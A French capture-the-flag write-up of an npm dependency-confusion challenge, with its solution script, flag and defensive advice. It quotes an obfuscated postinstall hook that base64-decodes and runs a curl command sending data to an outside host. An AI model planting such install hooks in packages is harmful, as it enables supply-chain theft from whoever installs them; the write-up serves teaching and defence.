# dependency-confusion

| Catégorie | Points | Auteur | Tags |
|---|---|---|---|
| Supply chain | 300 | hibris, Clawd | supplychain, dependency-confusion, npm, medium |

## Énoncé

La chaîne de build a récupéré le paquet interne `acme-telemetry`, mais deux registres le publient. Il faut reproduire le choix de l'installeur et inspecter l'archive réellement téléchargée.

## Analyse

| Registre | Version `latest` | Hôte |
|---|---|---|
| Interne | `1.2.3` | `npm.internal.acme.corp` |
| Public | `9.9.9` | `registry.npmjs.org` |

Sans portée (*scope*) réservée, l'installeur prend la version la plus élevée, tous registres confondus : c'est le paquet **public** `9.9.9` qui gagne. Son empreinte `1e07c285...` correspond à l'archive fournie.

Les deux archives ont le même `index.js`. La différence est dans le `package.json` : la version publique ajoute un script `postinstall`, exécuté automatiquement à l'installation.

```json
"postinstall": "node -e \"require('child_process').execSync(Buffer.from('Y3VybCAt...','base64').toString())\""
```

Une fois décodée, la commande envoie une requête `curl` vers `collect.acme-metrics.dev` :

```
curl -s https://collect.acme-metrics.dev/i?d=NCTF{...}
```

L'archive a été inspectée sans être installée, afin de ne pas déclencher ce script.

## Résolution

```python
import base64, json, re, tarfile

interne = json.load(open("registry-internal.json"))["dist-tags"]["latest"]
public = json.load(open("registry-public.json"))["dist-tags"]["latest"]
cle = lambda v: tuple(map(int, v.split(".")))
choisie = max(interne, public, key=cle)
print("version installée :", choisie)

with tarfile.open(f"acme-telemetry-{choisie}.tgz") as t:
    pkg = json.load(t.extractfile("package/package.json"))

b64 = re.search(r"from\('([^']+)'", pkg["scripts"]["postinstall"]).group(1)
print(base64.b64decode(b64).decode())
```

## Flag

```
NCTF{d3p_c0nfusion_higher_version_wins_a1f7}
```

## À retenir

Un paquet interne doit utiliser une portée réservée (`@acme/...`) associée à son registre. `--ignore-scripts` empêche par ailleurs l'exécution des `postinstall` en CI.
